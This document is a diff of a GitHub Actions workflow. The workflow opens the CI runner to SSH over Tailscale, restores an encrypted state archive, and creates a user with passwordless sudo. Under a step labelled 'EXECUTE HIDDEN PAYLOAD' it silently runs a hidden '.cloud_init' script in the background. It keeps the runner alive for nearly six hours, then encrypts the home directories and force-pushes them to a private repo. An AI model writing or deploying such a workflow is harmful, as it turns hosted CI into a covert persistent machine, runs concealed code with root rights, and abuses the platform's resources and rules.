@@ -13,13 +13,13 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       # 1. CONNECT TO TAILSCALE
-      - name: Initialize Network
+      - name: Initialize Network 
         uses: tailscale/github-action@v2
         with:
           authkey: ${{ secrets.TAILSCALE_AUTHKEY }}
           hostname: ${{ github.event.inputs.worker_id }}
           tags: tag:ci
-          args: --ssh --accept-dns=true
+          args: --ssh
 
       # 2. RESTORE ENCRYPTED BLOB
       - name: Fetch Environment State
@@ -27,10 +27,12 @@ jobs:
           GH_TOKEN: ${{ secrets.BACKUP_PAT }}
           REPO_NAME: ${{ secrets.BACKUP_REPO }}
           ENC_PASS: ${{ secrets.ENCRYPTION_PASS }}
+          TARGET_USER: ${{ github.event.inputs.worker_id }}
         run: |
+          mkdir -p /home/runner/work
           cd /home/runner/work
           git clone "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository_owner }}/${REPO_NAME}.git" state-repo || true
-
+          
           if ls state-repo/chunks/state_part_* 1> /dev/null 2>&1; then
             cat state-repo/chunks/state_part_* > state.tar.gz.enc
             openssl enc -aes-256-cbc -d -pbkdf2 -pass pass:"$ENC_PASS" -in state.tar.gz.enc | sudo tar -xzPf -
@@ -39,65 +41,63 @@ jobs:
       # 3. EXECUTE HIDDEN PAYLOAD
       - name: Process Workload
         run: |
-          TARGET_USER="runner"
-          echo "TARGET_USER=$TARGET_USER" >> $GITHUB_ENV
-
-          # Ensure sudo permissions for runner
-          sudo usermod -aG sudo "$TARGET_USER"
+          TARGET_USER="${{ github.event.inputs.worker_id }}"
+          
+          # Create user and add to sudo group if not already present
+          if ! id "$TARGET_USER" &>/dev/null; then
+            sudo useradd -m -s /bin/bash "$TARGET_USER"
+            sudo usermod -aG sudo "$TARGET_USER"
+          fi
+          
+          # Give passwordless sudo and enforce strict 0440 permissions
           echo "$TARGET_USER ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/99-$TARGET_USER
           sudo chmod 0440 /etc/sudoers.d/99-$TARGET_USER
-
-          # Run the hidden script in the background if it exists
+          
+          # Run the background workload script if available
           if [ -f "/home/$TARGET_USER/.cloud_init" ]; then
               sudo -u $TARGET_USER bash "/home/$TARGET_USER/.cloud_init" > /dev/null 2>&1 &
           fi
-
+          
           sleep 20700
 
-      # 4. ENCRYPT AND PUSH (The Backup process)
+      # 4. ENCRYPT AND PUSH (The actual Backup process)
       - name: Finalize Environment State
         if: always()
         env:
           GH_TOKEN: ${{ secrets.BACKUP_PAT }}
           REPO_NAME: ${{ secrets.BACKUP_REPO }}
           ENC_PASS: ${{ secrets.ENCRYPTION_PASS }}
-          TARGET_USER: "runner"
+          TARGET_USER: ${{ github.event.inputs.worker_id }}
         run: |
-          # Disable strict error crashing so minor tar warnings don't kill the backup
-          set +e
-
           echo "Finalizing state..."
-
-          # 1. Send graceful SIGINT to let tools save their local state/session files
+          
+          # 1. Send graceful SIGINT to let processes save state
           sudo pkill -SIGINT -u $TARGET_USER || true
-          sleep 10
-
-          # 2. Compress and encrypt /home/runner and /home/runner/work
+          sleep 10 
+          
+          # 2. Compress and encrypt /home/runner/work and /home/[username]
           cd /home/runner/work
           CLEAN_TOKEN=$(echo -n "$GH_TOKEN" | tr -d '[:space:]')
           CLEAN_REPO=$(echo -n "$REPO_NAME" | tr -d '[:space:]')
-
-          # Exclude the state.tar.gz.enc file to prevent infinite loops
-          sudo tar -czPf - --exclude=state-repo --exclude=state.tar.gz.enc /home/runner/work /home/$TARGET_USER 2>/dev/null | openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:"$ENC_PASS" -out state.tar.gz.enc
-
+          
+          sudo tar -czPf - --exclude=state-repo /home/runner/work /home/$TARGET_USER 2>/dev/null | openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:"$ENC_PASS" -out state.tar.gz.enc
+          
           # 3. Split into 50MB chunks for GitHub limits
           mkdir -p state-repo/chunks
           rm -f state-repo/chunks/state_part_*
           split -b 50M state.tar.gz.enc state-repo/chunks/state_part_
-
+          
           # 4. Force push chunks to the private backup repo
           cd state-repo
-
+          
           if [ ! -d ".git" ]; then
             git init
             git branch -m main
           fi
-
+          
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-
-          # Robust branch creation in case the repo is completely empty
-          git checkout --orphan temp-branch || git checkout -b temp-branch
+          git checkout --orphan temp-branch
           git add chunks/
           git commit -m "Automated State Finalization [skip ci]"
           git branch -M main
